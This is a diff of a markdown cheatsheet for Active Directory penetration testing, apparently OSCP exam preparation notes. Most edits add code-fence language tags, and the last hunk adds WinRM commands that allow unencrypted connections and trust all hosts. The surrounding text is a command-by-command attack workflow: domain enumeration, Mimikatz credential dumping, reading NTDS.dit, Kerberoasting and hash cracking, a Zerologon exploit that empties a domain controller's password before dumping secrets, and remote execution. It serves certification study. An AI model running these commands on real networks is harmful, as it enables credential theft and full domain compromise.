@@ -25,7 +25,7 @@ Goal:
 Enum users/groups/computers
 * Look for users with high-privs across the domain e.g. Domain Admins or Derivative Local Admins
 * Look for custom groups.
-```
+```powershell
 # get all users in the domain
 cmd> net user /domain
 cmd> net user [username] /domain
@@ -43,7 +43,7 @@ cmd> net view \\[computer_name] /domain
 ```
 
 Enum Domain Controller hostname (PdcRoleOwner)
-```
+```powershell
 PS> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
@@ -57,7 +57,7 @@ Enum Service Principal Names (AD Service Accounts)
   * `HTTP/MYCOMPUTER$` - Web services such as IIS.
   * `MSSQLSvc/MYCOMPUTER$` - MSSQL.
 
-```
+```bash
 # Example: search by web server (http) (see automated script below)
 $Searcher.filter="serviceprincipalname=*http*"
 
@@ -79,13 +79,13 @@ Address: 192.168.1.110
 
 Enum Service Principal Names.
 * Kerberoast `GetUserSPNs.ps1` script: https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
-```
+```powershell
 PS> .\GetUserSPNs.ps1
 ```
 
 Enum logged-in users and active user sessions.
 * More powerview commands https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
-```
+```powershell
 PS> Set-ExecutionPolicy Unrestricted
 PS> Import-Module .\PowerView.ps1
 PS> Get-NetLoggedon -ComputerName [computer_name]    # enum logged-in users
@@ -93,7 +93,7 @@ PS> Get-NetSession -ComputerName [domain_controller] # enum active user sessions
 ```
 
 Enum users/groups/computers/SPNs
-```
+```powershell
 # build the LDAP path
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 $PDC = ($domainObj.PdcRoleOwner).Name
@@ -148,7 +148,7 @@ NTLM authentication uses a challenge-response model, where a nonce/challenge enc
 Dumping LM/NTLM hashes with Mimikatz
 * [Full Mimikatz Guide](https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords)
 * Requires local admin rights.
-```
+```powershell
 # escalate security token to SYSTEM integrity
 mimikatz > privilege::debug
 mimikatz > token::elevate
@@ -159,7 +159,7 @@ mimikatz > sekurlsa::logonpasswords  # dump creds of logged-on users
 ```
 
 Other tools
-```
+```powershell
 cmd> pwdump.exe localhost
 cmd> fgdump.exe localhost          # improved pwdump, shutdown firewalls 
 cmd> type C:\Windows\NTDS\NTDS.dit # all domain hashes in NTDS.dit file on the Domain Controller
@@ -178,7 +178,7 @@ mimikatz > sekurlsa::tickets
 
 Service account attacks
 * If we know the `serviceprincipalname` value from prior AD enum, we can target the SPN by by requesting a service ticket for it from the Domain Controller and access resources from the service with our own ticket.
-```
+```powershell
 # request service ticket
 PS> Add-Type -AssemblyName System.IdentityModel
 PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \
@@ -189,7 +189,7 @@ mimikatz > kerberos::list /export
 ```
 
 Crack SPN hashes
-```
+```bash
 # Kerberoast
 $ python3 tgsrepcrack.py rockyou.txt [ticket.kirbi]  # locally crack hashes
 PS> Invoke-Kerberoast.ps1                            # crack hashes on target
@@ -205,7 +205,7 @@ $ john --wordlist=rockyou.txt johncrackfile
 Try Zerologon (requires reset after use as account pw is set to emtpy)
 * Source: https://github.com/risksense/zerologon
 * Affects ALL Windows Server versions, but we want to target DCs (high-value).
-```
+```bash
 # set computer account password to an empty string.
 $ python3 set_empty_pw.py [dc_computername] [dc_ip]
 $ python3 set_empty_pw.py xor-dc01 10.11.1.120 
@@ -216,16 +216,20 @@ $ python secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'xor/xor-dc01$
 ```
 
 Have plaintext credentials?
-```
+```bash
 # RDP clients
 $ rdesktop [target]
 $ remmina -c rdp://[username]:[password]@[target]
 
 # WinRM client (used in compromised computer) - ensure WSMAN port 5985 is open on target
-cmd> winrs -u:[username] -p:[password] -r:http://[target]:5985/wsman "cmd"
+PS> winrm quickconfig                                               # start winrm service
+PS> winrm set winrm/config/Client @{AllowUnencrypted = "true"}      # allow HTTP
+PS> Set-Item WSMan:localhost\client\trustedhosts -value *           # trust all hosts
+cmd> winrs -u:[username] -p:[password] -r:http://[target]:5985/wsman "cmd" # execute command
 
 # Admin groups but with a "MANDATORY LABEL\MEDIUM" context?
 # Try UAC bypass technique.
+# See https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-main.md#user-account-control-uac-bypass
 ```
 
 Pass-the-Hash
